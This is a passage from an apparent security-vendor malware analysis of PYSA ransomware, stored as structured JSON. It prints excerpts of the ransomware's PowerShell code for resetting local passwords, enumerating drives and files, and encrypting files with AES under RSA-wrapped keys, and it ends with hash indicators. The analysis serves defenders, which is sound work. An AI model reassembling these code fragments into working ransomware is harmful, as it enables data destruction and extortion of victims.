                    "text": "Finally, the malware changes the password of all local users to the value of the first 13 characters of the MD5 hash of the username with the string ololo appended. For example, the password for the username admin will be set to the first 13 characters of the MD5 hash of the string adminololo.",
                    "html": "<p>Finally, the malware changes the password of all local users to the value of the first 13 characters of the MD5 hash of the username with the string \u201cololo\u201d appended. For example, the password for the username \u201cadmin\u201d will be set to the first 13 characters of the MD5 hash of the string \u201cadminololo\u201d.</p>"
                },
                {
                    "id": "<sentence_0x4dff5535>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "foreach ($user in $localusers)<crlf>{<crlf>$myUser = \"$($user)ololo\"<crlf>$hash = Get-StringHash $myUser<crlf>$pass = $hash.substring(0, 13)<crlf>([adsi]\"WinNT://$env:COMPUTERNAME/$user\").SetPassword(\"$pass\");<crlf>}",
                    "html": "\nforeach ($user in $localusers)\n{\n $myUser = \"$($user)ololo\"\n $hash = Get-StringHash $myUser\n $pass = $hash.substring(0, 13)\n ([adsi]\"WinNT://$env:COMPUTERNAME/$user\").SetPassword(\"$pass\");\n}\n"
                }
            ]
        },
        {
            "id": "<chapter_0xfa29b826>",
            "title": "Use Of Chisel Tunneling Tool",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xfca33a45>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0x822bff1e>": "https://github.com/jpillora/chisel"
                    },
                    "text": "During the course of our investigation, we encountered three different Chisel samples in total, all of which were DLLs, programmed in Go. Chisel is a cross-platform traffic tunneling tool, utilized by multiple threat actors. The release version of Chisel consists of a single binary that covers both client and server functionality. The DLLs are wrappers to leverage the projects client side code. These DLLs function to decrypt the client configurations fields (IP, port, ), create a new instance of the Chisel client, and then invoke the client.",
                    "html": "<p>During the course of our investigation, we encountered three different <a href=\"https://github.com/jpillora/chisel\" rel=\"noopener noreferrer\" target=\"_blank\">Chisel</a> samples in total, all of which were DLLs, programmed in Go. Chisel is a cross-platform traffic tunneling tool, utilized by multiple threat actors. The release version of Chisel consists of a single binary that covers both client and server functionality. The DLLs are wrappers to leverage the project\u2019s client side code. These DLLs function to decrypt the client configuration\u2019s fields (IP, port, \u2026), create a new instance of the Chisel client, and then invoke the client.</p>"
                },
                {
                    "id": "<sentence_0x9b80391e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Digging deeper into the specific Chisel samples, we can see a few things including the various dependencies.",
                    "html": "<p>Digging deeper into the specific Chisel samples, we can see a few things including the various dependencies.</p>"
                },
                {
                    "id": "<sentence_0xb132e85b>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<img_0xa54b10b8>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/required.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "Packages & Dependencies for Chisel tool",
                    "html": "<figure class=\"wp-caption aligncenter\" id=\"attachment_65779\"><img alt=\"\" class=\"size-full wp-image-65779\" height=\"428\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/required.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"598\"/><figcaption class=\"wp-caption-text\" id=\"caption-attachment-65779\">Packages &amp; Dependencies for Chisel tool</figcaption></figure>"
                },
                {
                    "id": "<sentence_0x3dd6109e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xfd4c96ac>": "magic.dll"
                    },
                    "text": "The DLLs original filename was magic.dll, with the main payload being stored in the Debug export.",
                    "html": "<p>The DLL\u2019s original filename was <code>magic.dll</code>, with the main payload being stored in the \u201cDebug\u201d export.</p>"
                },
                {
                    "id": "<sentence_0xdd738bb>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x7f2562d1>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/exports.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"aligncenter size-full wp-image-65776\" height=\"116\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/exports.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"597\"/></p>"
                },
                {
                    "id": "<sentence_0x7bde1429>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xb3b8981>": "XOR",
                        "<code_0x8c136fc2>": "magicSocks"
                    },
                    "text": "Strings are individually XOR decrypted at runtime, including the C2 URL. This URL is then passed to the magicSocks function.",
                    "html": "<p>Strings are individually <code>XOR</code> decrypted at runtime, including the C2 URL. This URL is then passed to the <code>magicSocks</code> function.</p>"
                },
                {
                    "id": "<sentence_0x2d071aba>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<img_0x516f6e57>": "https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/c2.jpg?lossy=0&strip=1&webp=0"
                    },
                    "text": "",
                    "html": "<p><img alt=\"\" class=\"aligncenter size-full wp-image-65775\" height=\"251\" src=\"https://899029.smushcdn.com/2131410/wp-content/uploads/2022/04/c2.jpg?lossy=0&amp;strip=1&amp;webp=0\" width=\"624\"/></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xaa59d0b1>",
            "title": "Encryption Details (via PowerShell)",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xb99cdd98>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x9e451f58>": "p.ps1"
                    },
                    "text": "Beyond the use of Chisel, there are some interesting highlights within the execution of PYSA. The p.ps1 script is used to prepare the environment, as well as execute the actual ransomware with the desired configuration.",
                    "html": "<p>Beyond the use of Chisel, there are some interesting highlights within the execution of PYSA. The <code>p.ps1</code> script is used to prepare the environment, as well as execute the actual ransomware with the desired configuration.</p>"
                },
                {
                    "id": "<sentence_0x3284049e>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x1ba834b9>": "WMI"
                    },
                    "text": "The ransomware enumerates drives to encrypt via WMI, targeting only fixed drives.",
                    "html": "<p>The ransomware enumerates drives to encrypt via <code>WMI</code>, targeting only \u201cfixed\u201d drives.</p>"
                },
                {
                    "id": "<sentence_0xe0f34c2c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[array]$target_drives = get-wmiobject win32_volume | ? { $_.DriveType -eq 3 } | % { get-psdrive $_.DriveLetter[0] } | % { $_.Root };",
                    "html": "\n[array]$target_drives = get-wmiobject win32_volume | ? { $_.DriveType -eq 3 } | % { get-psdrive $_.DriveLetter[0] } | % { $_.Root };\n"
                },
                {
                    "id": "<sentence_0x91880d03>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "A pool of workers is used to speed up the encryption process by running jobs in parallel. These jobs are limited to 20 running at a time.",
                    "html": "<p>A pool of workers is used to speed up the encryption process by running jobs in parallel. These jobs are limited to 20 running at a time.</p>"
                },
                {
                    "id": "<sentence_0xf149dca6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "while ($running_jobs.Count -gt $max_workers)<crlf>{<crlf>Start-Sleep -Seconds 5;<crlf>[array]$running_jobs = $worker_jobs | Where { $_.State -eq \"Running\" };<crlf>}",
                    "html": "\nwhile ($running_jobs.Count -gt $max_workers)\n{\n Start-Sleep -Seconds 5;\n [array]$running_jobs = $worker_jobs | Where { $_.State -eq \"Running\" };\n}\n"
                },
                {
                    "id": "<sentence_0xa2421a7c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Target directories are enumerated on each fixed drive, skipping critical folders to avoid rendering the victims system inoperable. Directories in the root folder of the drive matching the following criteria are skipped (* is used as a wildcard):",
                    "html": "<p>Target directories are enumerated on each fixed drive, skipping critical folders to avoid rendering the victim\u2019s system inoperable. Directories in the root folder of the drive matching the following criteria are skipped (\u201c*\u201d is used as a wildcard):</p>"
                },
                {
                    "id": "<sentence_0xf5b113a6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "*Windows*<crlf>*Program Files*<crlf>*ProgramData*",
                    "html": "<ul>\n<li>*Windows*</li>\n<li>*Program Files*</li>\n<li>*ProgramData*</li>\n</ul>"
                },
                {
                    "id": "<sentence_0x8b9a161e>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Get-ChildItem \"$( $disk )*\" -Recurse -Force -Exclude \"*Windows*\", \"*Program Files*\", \"*ProgramData*\" | ? { $_.PSIsContainer } | Where-Object { ($_.FullName -notlike \"*Windows*\") -and ($_.FullName -notlike \"*Program Files*\") -and ($_.FullName -notlike \"*ProgramData*\") } | % { Show(@{ name = $_.FullName; ring = $SKbMxF }) };",
                    "html": "\nGet-ChildItem \"$( $disk )*\" -Recurse -Force -Exclude \"*Windows*\", \"*Program Files*\", \"*ProgramData*\" | ? { $_.PSIsContainer } | Where-Object { ($_.FullName -notlike \"*Windows*\") -and ($_.FullName -notlike \"*Program Files*\") -and ($_.FullName -notlike \"*ProgramData*\") } | % { Show(@{ name = $_.FullName; ring = $SKbMxF }) };\n"
                },
                {
                    "id": "<sentence_0x7123f62>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0x21df822c>": "\u201cC:\\Program Files\\*SQL*\u201d"
                    },
                    "text": "The ransomware includes one exception to the *Program Files* directory, targeting folders within the C:\\Program Files\\*SQL* directory. This is to ensure that SQL databases and other high-value SQL-related files are encrypted.",
                    "html": "<p>The ransomware includes one exception to the \u201c*Program Files*\u201d directory, targeting folders within the <code>\u201cC:\\Program Files\\*SQL*\u201d</code> directory. This is to ensure that SQL databases and other high-value SQL-related files are encrypted.</p>"
                },
                {
                    "id": "<sentence_0x96ed041a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Get-ChildItem \"C:\\Program Files*\" -Force -Recurse -Include \"*SQL*\" | Where { $_.PSIsContainer } |% { SubSqlItems($_.FullName) };",
                    "html": "\nGet-ChildItem \"C:\\Program Files*\" -Force -Recurse -Include \"*SQL*\" | Where { $_.PSIsContainer } |% { SubSqlItems($_.FullName) };\n"
                },
                {
                    "id": "<sentence_0x97b7fef7>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<a_0xcec2c815>": "https://www.sentinelone.com/blog/guide-encode-decoded-base64/",
                        "<code_0x1b8411df>": "\u201c|\u201d"
                    },
                    "text": "Once target folders have been enumerated, they are passed to a worker as a job. Each job executes a ScriptBlock that expects two arguments. The first argument is a base64 string of directories to encrypt, delimited by a |.",
                    "html": "<p>Once target folders have been enumerated, they are passed to a worker as a job. Each job executes a ScriptBlock that expects two arguments. The first argument is a <a href=\"https://www.sentinelone.com/blog/guide-encode-decoded-base64/\" rel=\"noopener noreferrer\" target=\"_blank\">base64</a> string of directories to encrypt, delimited by a <code>\u201c|\u201d</code>.</p>"
                },
                {
                    "id": "<sentence_0x235f32e2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$DVXJwpT = $args[0];<crlf>$include_zip = $args[1];<crlf>$JLzbvlx = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($DVXJwpT));<crlf>[array]$target_dirs = $JLzbvlx.split(\"|\");",
                    "html": "\n$DVXJwpT = $args[0];\n$include_zip = $args[1];\n$JLzbvlx = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($DVXJwpT));\n[array]$target_dirs = $JLzbvlx.split(\"|\");\n"
                },
                {
                    "id": "<sentence_0x39d969b6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The second argument is an option to have the ransomware run in a specific mode to target zip files for encryption, which requires the value 1.",
                    "html": "<p>The second argument is an option to have the ransomware run in a specific mode to target zip files for encryption, which requires the value \u201c1\u201d.</p>"
                },
                {
                    "id": "<sentence_0x3cc7782f>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "if ($include_zip -eq 1)<crlf>{<crlf>[array]$target_files = Get-ChildItem $qlsL -Force -Include \"*.zip\" | Where { !$_.PSIsContainer } | Where { $_ };<crlf>}",
                    "html": "\nif ($include_zip -eq 1)\n{\n [array]$target_files = Get-ChildItem $qlsL -Force -Include \"*.zip\" | Where { !$_.PSIsContainer } | Where { $_ };\n}\n"
                },
                {
                    "id": "<sentence_0x3d66c608>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "If this option is not enabled, then the ransomware will iterate through the target directories excluding the following file extensions from the encryption process.",
                    "html": "<p>If this option is not enabled, then the ransomware will iterate through the target directories excluding the following file extensions from the encryption process.</p>"
                },
                {
                    "id": "<sentence_0xdc7ce161>",
                    "is_empty": true,
                    "have_tags": true,
                    "tags": {
                        "<table_0xebea09ef>": {
                            "0": {
                                "0": ".ax",
                                "1": ".lnk",
                                "2": ".search-ms"
                            },
                            "1": {
                                "0": ".dll",
                                "1": ".msi",
                                "2": ".sys"
                            },
                            "2": {
                                "0": ".exe",
                                "1": ".ps1",
                                "2": ".tlb"
                            },
                            "3": {
                                "0": ".inc",
                                "1": ".README",
                                "2": ".zip"
                            }
                        }
                    },
                    "text": "",
                    "html": "<table>\n<tbody>\n<tr>\n<td>.ax</td>\n<td>.dll</td>\n<td>.exe</td>\n<td>.inc</td>\n</tr>\n<tr>\n<td>.lnk</td>\n<td>.msi</td>\n<td>.ps1</td>\n<td>.README</td>\n</tr>\n<tr>\n<td>.search-ms</td>\n<td>.sys</td>\n<td>.tlb</td>\n<td>.zip</td>\n</tr>\n</tbody>\n</table>"
                },
                {
                    "id": "<sentence_0x1ccd294c>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[array]$target_files = Get-ChildItem $qlsL -Force -Exclude \"*.zip\", \"*.inc\", \"*.ax\", \"*.tlb\", \"*.msi\", \"*.lnk\", \"*.dll\", \"*.exe\", \"*.README\", \"*.redacted\", \"*.search-ms\", \"*.ps1\", \"*.sys\" | Where { !$_.PSIsContainer } | Where { $_ };",
                    "html": "\n[array]$target_files = Get-ChildItem $qlsL -Force -Exclude \"*.zip\", \"*.inc\", \"*.ax\", \"*.tlb\", \"*.msi\", \"*.lnk\", \"*.dll\", \"*.exe\", \"*.README\", \"*.redacted\", \"*.search-ms\", \"*.ps1\", \"*.sys\" | Where { !$_.PSIsContainer } | Where { $_ };\n"
                },
                {
                    "id": "<sentence_0xb2b79e49>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xa72d5697>": "crypt()"
                    },
                    "text": "Once this list of files is generated, each file path is passed to the crypt() function to perform the encryption.",
                    "html": "<p>Once this list of files is generated, each file path is passed to the <code>crypt()</code> function to perform the encryption.</p>"
                },
                {
                    "id": "<sentence_0x323178ae>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "foreach ($target_file in $target_files_list)<crlf>{<crlf>crypt($target_file.FullName);<crlf>}",
                    "html": "\nforeach ($target_file in $target_files_list)\n{\n crypt($target_file.FullName);\n}\n"
                },
                {
                    "id": "<sentence_0xf19db9a2>",
                    "is_empty": false,
                    "have_tags": true,
                    "tags": {
                        "<code_0xe036cb32>": "crypt()",
                        "<code_0x59d361bf>": "RNGCryptoServiceProvider"
                    },
                    "text": "Within the crypt() function, a random 32-byte AES key is generated for each individual target file. Along with the key, a random 16 byte initialization vector (IV) is generated using the RNGCryptoServiceProvider class.",
                    "html": "<p>Within the <code>crypt()</code> function, a random 32-byte AES key is generated for each individual target file. Along with the key, a random 16 byte initialization vector (IV) is generated using the <code>RNGCryptoServiceProvider</code> class.</p>"
                },
                {
                    "id": "<sentence_0xf1af5cc5>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$rng_crypto_service_provider = New-Object System.Security.Cryptography.RNGCryptoServiceProvider;<crlf>$aes_key = New-Object byte[] 32;<crlf>$rng_crypto_service_provider.GetBytes($aes_key);<crlf>$init_vec = New-Object byte[] 16;<crlf>$rng_crypto_service_provider.GetBytes($init_vec);",
                    "html": "\n$rng_crypto_service_provider = New-Object System.Security.Cryptography.RNGCryptoServiceProvider;\n$aes_key = New-Object byte[] 32;\n$rng_crypto_service_provider.GetBytes($aes_key);\n$init_vec = New-Object byte[] 16;\n$rng_crypto_service_provider.GetBytes($init_vec);\n"
                },
                {
                    "id": "<sentence_0x471be7c7>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The AES service provider is then instantiated, setting the key and IV to the randomly generated values mentioned previously.",
                    "html": "<p>The AES service provider is then instantiated, setting the key and IV to the randomly generated values mentioned previously.</p>"
                },
                {
                    "id": "<sentence_0xc675bde2>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$aes_crypto_service_provider = New-Object System.Security.Cryptography.AesCryptoServiceProvider;<crlf>$aes_crypto_service_provider.Key = $aes_key;<crlf>$aes_crypto_service_provider.IV = $init_vec;<crlf>$aes_crypto_service_provider.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;",
                    "html": "\n$aes_crypto_service_provider = New-Object System.Security.Cryptography.AesCryptoServiceProvider;\n$aes_crypto_service_provider.Key = $aes_key;\n$aes_crypto_service_provider.IV = $init_vec;\n$aes_crypto_service_provider.Padding = [System.Security.Cryptography.PaddingMode]::Zeros;\n"
                },
                {
                    "id": "<sentence_0x80cfd8ac>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The RSA service provider is then instantiated using a hardcoded RSA XML string.",
                    "html": "<p>The RSA service provider is then instantiated using a hardcoded RSA XML string.</p>"
                },
                {
                    "id": "<sentence_0xcc452c1a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$encryptor = $aes_crypto_service_provider.CreateEncryptor();<crlf>$rsa_crypto_service_provider = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 4096;<crlf>$rsa_crypto_service_provider.PersistKeyInCsp = $false;<crlf>$rsa_crypto_service_provider.FromXmlString($rsa_key_string);<crlf>$rsa_key_string = \"sLdwS+FAAou46fSHkm/5NzsuRy5l5Iqf/+Jy/ZLCbPmrKVvhre0R1no1[...]\"",
                    "html": "\n$encryptor = $aes_crypto_service_provider.CreateEncryptor();\n$rsa_crypto_service_provider = New-Object System.Security.Cryptography.RSACryptoServiceProvider -ArgumentList 4096;\n$rsa_crypto_service_provider.PersistKeyInCsp = $false;\n$rsa_crypto_service_provider.FromXmlString($rsa_key_string);\n$rsa_key_string = \"sLdwS+FAAou46fSHkm/5NzsuRy5l5Iqf/+Jy/ZLCbPmrKVvhre0R1no1[...]\"\n"
                },
                {
                    "id": "<sentence_0xe0cc608a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The AES key and IV are both then encrypted with the RSA key.",
                    "html": "<p>The AES key and IV are both then encrypted with the RSA key.</p>"
                },
                {
                    "id": "<sentence_0x29f945e6>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$qGOTKey = $rsa_crypto_service_provider.Encrypt($aes_key, $false);<crlf>$Dbw = $rsa_crypto_service_provider.Encrypt($init_vec, $false);",
                    "html": "\n$qGOTKey = $rsa_crypto_service_provider.Encrypt($aes_key, $false);\n$Dbw = $rsa_crypto_service_provider.Encrypt($init_vec, $false);\n"
                },
                {
                    "id": "<sentence_0x81270854>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The ransomware then proceeds to encrypt the contents of the file starting at the offset 1671.",
                    "html": "<p>The ransomware then proceeds to encrypt the contents of the file starting at the offset 1671.</p>"
                },
                {
                    "id": "<sentence_0xe569a469>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$PBz = 1671;<crlf>[...]<crlf>$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);<crlf>[long]$iGzfUwq = $file_stream.Read($mctMK, 0, $mctMKSize);<crlf>$qGOT = $encryptor.TransformFinalBlock($mctMK, 0, $iGzfUwq);<crlf>$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);<crlf>$file_stream.Write($qGOT, 0, $iGzfUwq);",
                    "html": "\n$PBz = 1671;\n[...]\n$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);\n[long]$iGzfUwq = $file_stream.Read($mctMK, 0, $mctMKSize);\n$qGOT = $encryptor.TransformFinalBlock($mctMK, 0, $iGzfUwq);\n$file_stream.Seek($PBz, [System.IO.SeekOrigin]::Begin);\n$file_stream.Write($qGOT, 0, $iGzfUwq);\n"
                },
                {
                    "id": "<sentence_0x3240b262>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "Approximately 10% of each file is encrypted, calculated using the following logic.",
                    "html": "<p>Approximately 10% of each file is encrypted, calculated using the following logic.</p>"
                },
                {
                    "id": "<sentence_0x6d8262d3>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "[long]$mctMKSize = $MZKSize / 10;<crlf>if ($mctMKSize -gt 6225920)<crlf>{<crlf>$mctMKSize = 6225920;<crlf>}<crlf>else<crlf>{<crlf>$SZdRf = [math]::floor($mctMKSize / 1024);<crlf>if ($SZdRf -eq 0)<crlf>{<crlf>$SZdRf = 1;<crlf>}<crlf>$mctMKSize = 1024 * $SZdRf;<crlf>}",
                    "html": "\n[long]$mctMKSize = $MZKSize / 10;\nif ($mctMKSize -gt 6225920)\n{\n $mctMKSize = 6225920;\n}\nelse\n{\n $SZdRf = [math]::floor($mctMKSize / 1024);\n if ($SZdRf -eq 0)\n {\n $SZdRf = 1;\n }\n $mctMKSize = 1024 * $SZdRf;\n}\n"
                },
                {
                    "id": "<sentence_0x6ddf7b07>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "The encrypted AES key and IV are both written to the end of the newly encrypted file, and the file name is appended with the custom extension chosen by the attacker.",
                    "html": "<p>The encrypted AES key and IV are both written to the end of the newly encrypted file, and the file name is appended with the custom extension chosen by the attacker.</p>"
                },
                {
                    "id": "<sentence_0x5f3ba948>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "$file_stream.Seek(0, [System.IO.SeekOrigin]::End);<crlf>$file_stream.Write($qGOTKey, 0, $qGOTKey.Length);<crlf>$file_stream.Write($Dbw, 0, $Dbw.Length);<crlf>$file_stream.Close();<crlf>Rename-Item -Path $file_to_encrypt -NewName \"$( $file_to_encrypt ).redacted\";",
                    "html": "\n$file_stream.Seek(0, [System.IO.SeekOrigin]::End);\n$file_stream.Write($qGOTKey, 0, $qGOTKey.Length);\n$file_stream.Write($Dbw, 0, $Dbw.Length);\n$file_stream.Close();\nRename-Item -Path $file_to_encrypt -NewName \"$( $file_to_encrypt ).redacted\";\n"
                }
            ]
        },
        {
            "id": "<chapter_0xf9160a64>",
            "title": "Protecting Against PYSA Ransomware",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xe3dcc79a>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "SentinelOne customers are fully-protected against PYSA ransomware.",
                    "html": "<p>SentinelOne customers are fully-protected against PYSA ransomware. </p>"
                },
                {
                    "id": "<sentence_0x36fc1bf9>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                },
                {
                    "id": "<sentence_0x6146300c>",
                    "is_empty": true,
                    "have_tags": false,
                    "tags": {},
                    "text": "",
                    "html": "<p></p>"
                }
            ]
        },
        {
            "id": "<chapter_0xde8a34e>",
            "title": "Conclusion",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0x913e9bf4>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "PYSA has outlasted some of its contemporaries through careful choice of targets as well as affiliates. Although the groups TTPs cannot be described as technically advanced, the use of the Chisel tunneling tool and preparation of the target environment via PowerShell scripts is sufficiently novel to be worth documenting. We hope that providing visibility into all the various steps in the attack chain will be helpful for defenders and threat hunters to identify, detect and prevent such attacks.",
                    "html": "<p>PYSA has outlasted some of its contemporaries through careful choice of targets as well as affiliates. Although the group\u2019s TTPs cannot be described as technically advanced, the use of the Chisel tunneling tool and preparation of the target environment via PowerShell scripts is sufficiently novel to be worth documenting. We hope that providing visibility into all the various steps in the attack chain will be helpful for defenders and threat hunters to identify, detect and prevent such attacks.</p>"
                }
            ]
        },
        {
            "id": "<chapter_0x367c68f8>",
            "title": "Indicators of Compromise",
            "title_level": 2,
            "sentences": [
                {
                    "id": "<sentence_0xd6b8e41d>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "SHA1<crlf>6b6855931e69d27f5f2e2d828fbeb4db91688996<crlf>6aa7b2744a7e3975f0dff3672ec633b687ef5fbd<crlf>598da6d3ac08e21c39807fffabd2f597edb4cbb8<crlf>9200e264a9916534798d79a9aab69359f65e5fc7<crlf>11e399bed1a2e4ac51dfbae16a21f1adaff7c95f<crlf>ef14422bf5d013878cd12abf44a7720b92d1750c<crlf>8e6c7618699ac39393aa01fd99848f868c0921f2<crlf>407933cdb8ba12cf61606803be354b87f2674321<crlf>d02608e1771af7c19413ecf504e2df2989f25da3<crlf>69dab8db13bbe0b9ddac7aeeb52fde3928030e43<crlf>44013f5f6f5c88482441f1fa673e1ada7d6e845f<crlf>a80b1f9f44156bc876b9f1e641745af1a5a77be2<crlf>b435fedf7e40e3ef24dba050102d63e2d5aa2e1e<crlf>94a351849632c435f6809eda080f52e6d0ad1195<crlf>f7d7567d1721478eee276001aeeba44473a713ef<crlf>6f5f822260e4deaa859f3f17e81d9349950d9e34<crlf>51cbc9455b7781cf0529f299631e59016fe52e95<crlf>8ec2266a0e4c807973a27bc9cf5b10b4d11f6c5c<crlf>52b2fc13ec0dbf8a0250c066cd3486b635a27827<crlf>425209b891142704462baf14048d0dd59d0c7561",
                    "html": "<p>SHA1\n6b6855931e69d27f5f2e2d828fbeb4db91688996\n6aa7b2744a7e3975f0dff3672ec633b687ef5fbd\n598da6d3ac08e21c39807fffabd2f597edb4cbb8\n9200e264a9916534798d79a9aab69359f65e5fc7\n11e399bed1a2e4ac51dfbae16a21f1adaff7c95f\nef14422bf5d013878cd12abf44a7720b92d1750c\n8e6c7618699ac39393aa01fd99848f868c0921f2\n407933cdb8ba12cf61606803be354b87f2674321\nd02608e1771af7c19413ecf504e2df2989f25da3\n69dab8db13bbe0b9ddac7aeeb52fde3928030e43\n44013f5f6f5c88482441f1fa673e1ada7d6e845f\na80b1f9f44156bc876b9f1e641745af1a5a77be2\nb435fedf7e40e3ef24dba050102d63e2d5aa2e1e\n94a351849632c435f6809eda080f52e6d0ad1195\nf7d7567d1721478eee276001aeeba44473a713ef\n6f5f822260e4deaa859f3f17e81d9349950d9e34\n51cbc9455b7781cf0529f299631e59016fe52e95\n8ec2266a0e4c807973a27bc9cf5b10b4d11f6c5c\n52b2fc13ec0dbf8a0250c066cd3486b635a27827\n425209b891142704462baf14048d0dd59d0c7561</p>"
                },
                {
                    "id": "<sentence_0xd13cc3d0>",
                    "is_empty": false,
                    "have_tags": false,
                    "tags": {},
                    "text": "SHA256<crlf>e9662b468135f758a9487a1be50159ef57f3050b753de2915763b4ed78839ead<crlf>44f1def68aef34687bfacf3668e56873f9d603fc6741d5da1209cc55bdc6f1f9<crlf>0433efd9ba06378eb6eae864c85aafc8b6de79ef6512345294e9e379cc054c3d<crlf>164cb8e82d7e07cca0409925cadd8be5e3e8e07db88526ff7fe87596c6a6bd07<crlf>7c774062bc55e2d0e869d5d69820aa6e3b759454dbc926475b4db6f7f2b6cb14<crlf>58ebe9b1c926c87dc1e9d924942504a56456007bff8de4932ef18e476da700c2<crlf>6f3cd5f05ab4f404c78bab92f705c91d967b31a9b06017d910af312fa87ae3d6<crlf>1e39243c218056dbe72b6b889f2245b3d0f49f29952950d4b83581263c09c1ae<crlf>fb31b023d2545563862c9c314d91770fcec7bb7a4b13abfdb5244266a67446a3<crlf>153222163442b304f5cee295268115c9cfdf0f1168f49f9e3fae52340eee51ec<crlf>d1b6ee9b716fe48e51ac4e6bec691366bb08d507773d61a5d14fb15ec5e25e2b<crlf>6f4338a7a3ef8e491279ae81543a08554cad15d1bce6007047bc4449d945b799<crlf>051fb654403340420102430f807ea41ab790666488d897dc5b0008e99fed47d6<crlf>75c8e93ffcfd84f0d3444c0b9fc8c9a462f91540c8760025c393a749d198d9db<crlf>7fd3000a3afbf077589c300f90b59864ec1fb716feba8e288ed87291c8fdf7c3<crlf>931772ac59f5859e053589202c8db81edc01911391fe5b32c9abb5bbc2b06e43<crlf>af99b482eb0b3ff976fa719bf0079da15f62a6c203911655ed93e52ae05c4ac8<crlf>90cf35560032c380ddaaa05d9ed6baacbc7526a94a992a07fd02f92f371a8e92<crlf>4770a0447ebc83a36e590da8d01ff4a418d58221c1f44d21f433aaf18fad5a99<crlf>e4287e9708a73ce6a9b7a3e7c72462b01f7cc3c595d972cf2984185ac1a3a4a8",
